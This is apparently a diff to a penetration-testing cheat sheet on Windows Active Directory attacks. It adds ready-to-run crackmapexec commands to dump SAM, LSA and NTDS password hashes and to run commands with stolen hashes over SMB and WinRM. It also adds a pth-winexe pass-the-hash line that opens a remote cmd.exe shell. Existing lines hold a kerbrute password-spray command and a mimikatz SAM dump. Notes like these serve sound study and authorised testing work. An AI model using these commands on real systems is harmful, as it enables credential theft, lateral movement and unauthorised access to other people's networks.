@@ -1424,9 +1424,20 @@ kerbrute passwordspray -d corp.com .\usernames.txt "pass"
 ```
 
 ### Pass the hash (lateral movement) for NTLM only
+- Access local SAM database (C:\Windows\System32\config\SAM) and dump all local hashes
 
+#### Using Crackmapexec
+- Path storing hashes: `~/.cme/logs`. 3 types of files: .sam, .secrets, .cached
+ 
+- Dump SAM hashes: `crackmapexec smb 192.168.1.54 -u ippsec -p Password12345 --sam`
+- Dump LSA dump (domain credentials): `crackmapexec smb 192.168.1.54 -u ippsec -p Password12345 --lsa`
+- Exploitation: `crackmapexec smb 192.168.1.54 -u jenkinsadmin -H ffffffffffffffffffffffff -X 'whoami'`
+- Exploitation to dump all hashes (if is domain admin access): `crackmapexec smb 192.168.1.50 -u jenkinsadmin -H ffffffffffffffffffffffff --ntds`
+- Exploitation to run commands as another user using PTH: `crackmapexec winrm 192.168.1.50 -u s4vitar -H ffffffffffffffffffffffff -X 'whoami'`
 
-- Access local SAM database and dump all local hashes
+#### Using pth-winexe 
+- pass the hash get a shell immediately: `sudo pth-winexe -U web/administrator%<hash:hash> //192.168.1.54 cmd.exe`
+
 ```powershell
 PS C:\users\public > mimikatz.exe "privilege::debug" "lsadump::sam" "exit" > sam.txt
 ```
